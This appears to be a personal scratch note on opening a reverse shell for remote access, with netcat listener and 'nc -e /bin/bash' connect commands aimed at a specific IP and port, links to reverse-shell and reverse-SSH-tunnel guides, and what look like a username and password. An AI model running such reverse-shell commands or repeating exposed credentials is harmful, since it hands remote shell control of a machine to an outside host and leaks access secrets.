https://github.com/lukechilds/reverse-shell











# does not work

remote
pi
iwilldowhateverineedtodo6969



ON REMOTE:
nc -lnvp <PORT> -s <IP OF CONNECTOR>
nc -lnvp 87 -s 67.170.160.36


ON CONNECTOR:
nc -e /bin/bash <IP OF CONNECTOR> <PORT>
nc -e /bin/bash 67.170.160.36 87

# LIST

https://dev.to/bulletmark/create-a-reverse-ssh-tunnel-for-remote-access-to-a-restricted-machine-1ma0

